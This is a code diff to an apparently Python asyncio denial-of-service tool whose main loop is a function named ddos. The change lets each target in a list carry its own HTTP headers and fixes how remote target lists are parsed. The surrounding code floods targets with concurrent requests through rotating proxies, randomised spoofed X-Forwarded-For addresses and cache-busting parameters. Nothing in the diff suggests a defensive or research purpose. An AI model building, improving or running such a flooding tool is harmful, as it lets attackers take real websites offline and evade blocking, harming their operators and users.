@@ -2,6 +2,7 @@
 import asyncio
 import json
 import multiprocessing
+import re
 from http import HTTPStatus
 
 import uvloop
@@ -76,7 +77,7 @@ def prepare_url(url: str, with_random_get_param: bool):
     return url
 
 
-def make_headers(user_agent: str, random_xff_ip: bool, custom_headers: str) -> Dict[str, str]:
+def make_headers(user_agent: str, random_xff_ip: bool, custom_headers: str, target_headers: List[Tuple[str, str]]) -> Dict[str, str]:
     headers = {}
     if user_agent:
         headers['user-agent'] = user_agent
@@ -89,14 +90,23 @@ def make_headers(user_agent: str, random_xff_ip: bool, custom_headers: str) -> D
             logging.error('Custom header not applied - incorrect json')
         else:
             headers.update(custom_headers_dict)
+    if target_headers:
+        headers.update(target_headers)
     return headers
 
 
+def split_target(target: str):
+    target_url = re.split(r"[\s+]", target)[0]
+    target_headers = re.findall(r"\s*\+\s*(\S+?):\s*([^\s+]+)", target)
+    return target_url, target_headers
+
+
 async def ddos(
-        target_url: str, timeout: int, count: int, proxy_iterator: Iterable[Tuple[str, str, int]],
+        target: str, timeout: int, count: int, proxy_iterator: Iterable[Tuple[str, str, int]],
         with_random_get_param: bool, user_agent: str, ignore_response: bool, random_xff_ip: bool, custom_headers: str,
         stop_attack: int
 ):
+    target_url, target_headers = split_target(target)
     step = 0
     while True:
         if count and step > count:
@@ -105,7 +115,7 @@ async def ddos(
             break
         step += 1
         proxy = get_proxy(proxy_iterator)
-        headers = make_headers(user_agent, random_xff_ip, custom_headers)
+        headers = make_headers(user_agent, random_xff_ip, custom_headers, target_headers)
         await make_request(prepare_url(target_url, with_random_get_param), proxy, timeout, headers, ignore_response)
         log_stats()
 
@@ -118,16 +128,16 @@ def log_stats():
 
 
 async def amain(
-        target_urls: List[str], timeout: int, concurrency: int, count: int, proxies: List[Tuple[str, str, int]],
+        targets: List[str], timeout: int, concurrency: int, count: int, proxies: List[Tuple[str, str, int]],
         with_random_get_param: bool, user_agent: str, ignore_response: bool, random_xff_ip: bool, custom_headers: str,
         stop_attack: int
 ):
     coroutines = []
     proxy_iterator = cycle(proxies or [])
-    for target_url in target_urls:
+    for target in targets:
         for _ in range(concurrency):
             coroutines.append(
-                ddos(target_url, timeout, count, proxy_iterator, with_random_get_param, user_agent, ignore_response,
+                ddos(target, timeout, count, proxy_iterator, with_random_get_param, user_agent, ignore_response,
                      random_xff_ip,
                      custom_headers, stop_attack)
             )
@@ -143,7 +153,7 @@ def load_targets(target_urls_files: Tuple[str]) -> List[str]:
         else:
             try:
                 res = requests.get(target_urls_file)
-                target_urls.extend(line.strip() for line in res.text.split())
+                target_urls.extend(line.strip() for line in res.text.splitlines())
             except:
                 pass
     logging.info('Loaded %s targets to ddos', len(target_urls))
@@ -160,11 +170,11 @@ def process(
     uvloop.install()
     set_limits()
     proxies = load_proxies(proxy_file, proxy_url, shuffle=shuffle_proxy)
-    target_urls = load_targets(target_urls_file)
-    target_urls.extend(target_url)
+    targets = load_targets(target_urls_file)
+    targets.extend(target_url)
     loop = asyncio.get_event_loop()
     loop.run_until_complete(
-        amain(target_urls,
+        amain(targets,
               timeout,
               concurrency,
               count,
